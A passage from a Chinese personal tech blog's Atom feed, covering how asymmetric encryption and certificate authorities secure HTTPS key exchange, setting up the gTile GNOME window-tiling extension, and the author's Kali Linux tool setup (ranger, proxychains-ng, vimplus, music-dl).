title="非对称密钥加密"></a>非对称密钥加密</h3><ul><li><p>“非对称加密”使用的时候有两把锁，一把叫做“私有密钥”，一把是“公开密钥”，使用非对象加密的加密方式的时候，服务器首先告诉客户端按照自己给定的公开密钥进行加密处理，客户端按照公开密钥加密以后，服务器接受到信息再通过自己的私有密钥进行解密。</p><p><strong>这样做的好处就是解密的钥匙根本就不会进行传输，因此也就避免了被挟持的风险。就算公开密钥被窃听者拿到了，它也很难进行解密，因为解密过程是对离散对数求值，这可不是轻而易举就能做到的事。</strong></p><p><strong>缺点：</strong></p><ul><li>如何保证接收端向发送端发出公开秘钥的时候，发送端确保收到的是预先要发送的，而不会被挟持。只要是发送密钥，就有可能有被挟持的风险。</li><li>非对称加密的方式效率比较低，它处理起来更为复杂，通信过程中使用就有一定的效率问题而影响通信速度</li></ul><p><img src="/images/https-key2.png"></p></li></ul><h3 id="证书密钥加密"><a href="#证书密钥加密" class="headerlink" title="证书密钥加密"></a>证书密钥加密</h3><p>数字证书认证机构是客户端与服务器都可信赖的第三方机构。</p><p>传播过程：</p><ul><li>服务器的开发者携带公开密钥，向数字证书认证机构提出公开密钥的申请，数字证书认证机构在认清申请者的身份，审核通过以后，会对开发者申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将密钥放在证书里面，绑定在一起</li><li>服务器将这份数字证书发送给客户端，因为客户端也认可证书机构，客户端可以通过数字证书中的数字签名来验证公钥的真伪，来确保服务器传过来的公开密钥是真实的。一般情况下，证书的数字签名是很难被伪造的，这取决于认证机构的公信力。一旦确认信息无误之后，客户端就会通过公钥对报文进行加密发送，服务器接收到以后用自己的私钥进行解密。</li></ul><p><img src="/images/https-key3.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h2&gt;&lt;p&gt;服务器和客户端进行数据交互的一种形式。&lt;/p&gt;
&lt;h2 id=&quot;常用请求头信息&quot;&gt;&lt;a href=&quot;#常用请求头信息&quot; class=&quot;hea</summary>
      
    
    
    
    <category term="Web安全" scheme="https://whoiszkuan.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Security" scheme="https://whoiszkuan.github.io/tags/Security/"/>
    
    <category term="Web" scheme="https://whoiszkuan.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>gTile Linux split screen</title>
    <link href="https://whoiszkuan.github.io/2021/08/14/gTile%20Linux%20split%20screen/"/>
    <id>https://whoiszkuan.github.io/2021/08/14/gTile%20Linux%20split%20screen/</id>
    <published>2021-08-14T07:26:29.000Z</published>
    <updated>2021-10-31T08:45:27.636Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><strong>这是Gnome-Shell的一个扩展插件，由于Gnome桌面的平铺方案最多只能两个窗口，对于大屏幕显示器来说是不够用的，而gTile可以解决这个问题。</strong></p><p><strong>gTile拥有多个内置平铺方案，可平铺多个窗口，增加工作效率。可自行配置快捷键唤醒gTile进行平铺</strong></p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="Gnome-Extensions-Install"><a href="#Gnome-Extensions-Install" class="headerlink" title="Gnome Extensions Install"></a>Gnome Extensions Install</h2><p><strong>先安装Gnome-Shell再安装扩展</strong> <a href="https://extensions.gnome.org/extension/28/gtile/">gTile-Gnome-Shell</a><br><img src="/images/gtile-1.png"></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>打开扩展方式：Gnome Tweak Tools(优化) –&gt; Extensions(扩展) –&gt; Gtile(点击开启按钮)</p><p>点击设置按钮进入配置界面，点击(Accelerators)选项可配置快捷键，唤醒gTile的快捷键为<code>Super+Enter</code>。更多快捷键请自行探索。<br><img src="/images/gtile-2.png"></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><ol><li><code>Super+Enter</code>唤醒gTile <img src="/images/gtile-3.png"></li><li>按下键盘数字键0～9使用预设方案<code>Super+Enter+3</code> <img src="/images/gtile-4.png"></li></ol><p>还有更多预设方案可多个窗口平铺<br><img src="/images/gtile-5.png"><br><img src="/images/gtile-6.png"><br><img src="/images/gtile-7.png"></p><p>GitHub gTile:<a href="https://github.com/gtile/gtile">Gtile项目地址</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;这是Gnome-Shell的一个扩展插件，由于Gnome桌面的平铺方案最多只能两个窗口，对于大屏幕显示器来说是不够用的，而g</summary>
      
    
    
    
    <category term="Linux" scheme="https://whoiszkuan.github.io/categories/Linux/"/>
    
    <category term="配置" scheme="https://whoiszkuan.github.io/categories/Linux/%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="Linux" scheme="https://whoiszkuan.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>About My LInux</title>
    <link href="https://whoiszkuan.github.io/2021/08/12/About%20My%20LInux/"/>
    <id>https://whoiszkuan.github.io/2021/08/12/About%20My%20LInux/</id>
    <published>2021-08-12T04:02:39.000Z</published>
    <updated>2021-10-31T08:29:32.080Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简言"><a href="#简言" class="headerlink" title="简言"></a>简言</h1><p>由于平时比较喜欢折腾Linux，经常会把系统反复安装，许多原先配置好的东西都忘记了,所以打算写一篇来记录一下自己平时配置的文件操作。<br><strong>注：本人使用的Linux系统为Kali Linux</strong></p><h2 id="ranger"><a href="#ranger" class="headerlink" title="ranger"></a>ranger</h2><p>ranger是一款命令行文件资源管理器，提供多级视图，方便操作</p><blockquote><p>sudo apt install ranger</p></blockquote><p>启动命令：<code>ranger</code><br><img src="/images/ranger.png"></p><h2 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h2><p>proxychains是一款命令行代理工具，可将当前应用的TCP转发至代理，非全局代理。<br>目前支持Tor,HTTP,Socks代理。</p><blockquote><p>git clone <a href="https://github.com/rofl0r/proxychains-ng">https://github.com/rofl0r/proxychains-ng</a><br>cd proxychains-ng<br>./configure<br>sudo make &amp;&amp; make install</p></blockquote><p>代理配置文件位置：<code>/etc/proxychains.conf</code><br>启动命令：<code>proxychains4 &lt;启动应用&gt;</code></p><h2 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h2><p>相比Linux下的程序员都知道Vim，由于自己平时比较懒，不想学Vim的语法，所以Vim并没有自己配置，而是使用了<code>Vim-Plus</code>，即开即用。</p><blockquote><p>git clone <a href="https://github.com/chxuan/vimplus.git">https://github.com/chxuan/vimplus.git</a> ~/.vimplus<br>cd ~/.vimplus<br>./install.sh</p></blockquote><p><img src="/images/vim.png"><br>Vim的主题被我注释掉了，使用的主题是Terminal自带的Kali-Dark主题配色。</p><h2 id="music-dl"><a href="#music-dl" class="headerlink" title="music-dl"></a>music-dl</h2><p>music-dl是一款基于Python3的命令行网络音乐聚合搜索下载工具。</p><p>使用pip3安装，前提需要安装pip3：<code>sudo apt install pip3</code><br>安装music-dl:<code>sudo pip3 install pymusic-dl</code></p><p><img src="/images/music-dl.png"></p><blockquote><p>$ music-dl –help<br>Usage: music-dl [OPTIONS]</p><p> Search and download music from netease, qq, kugou, baidu and xiami.<br>  Example: music-dl -k “周杰伦”</p><p>Options:<br>  –version             Show the version and exit.<br>  -k, –keyword TEXT    搜索关键字，歌名和歌手同时输入可以提高匹配（如 空帆船 朴树）<br>  -u, –url TEXT        通过指定的歌曲URL下载音乐<br>  -p, –playlist TEXT   通过指定的歌单URL下载音乐<br>  -s, –source TEXT     Supported music source: qq netease kugou baidu<br>  -n, –number INTEGER  Number of search results<br>  -o, –outdir TEXT     Output directory<br>  -x, –proxy TEXT      Proxy (e.g. <a href="http://127.0.0.1:1087/">http://127.0.0.1:1087</a>)<br>  -v, –verbose         Verbose mode<br>  –lyrics              同时下载歌词<br>  –cover               同时下载封面<br>  –nomerge             不对搜索结果列表排序和去重<br>  –help                Show this message and exit.</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简言&quot;&gt;&lt;a href=&quot;#简言&quot; class=&quot;headerlink&quot; title=&quot;简言&quot;&gt;&lt;/a&gt;简言&lt;/h1&gt;&lt;p&gt;由于平时比较喜欢折腾Linux，经常会把系统反复安装，许多原先配置好的东西都忘记了,所以打算写一篇来记录一下自己平时配置的文件操作。&lt;br&gt;</summary>
      
    
    
    
    <category term="Linux" scheme="https://whoiszkuan.github.io/categories/Linux/"/>
    
    <category term="配置" scheme="https://whoiszkuan.github.io/categories/Linux/%E9%85%8D%E7%BD%AE/"/>
    
    
    <category term="Linux" scheme="https://whoiszkuan.github.io/tags/Linux/"/>
    
  </entry>
  
</feed>
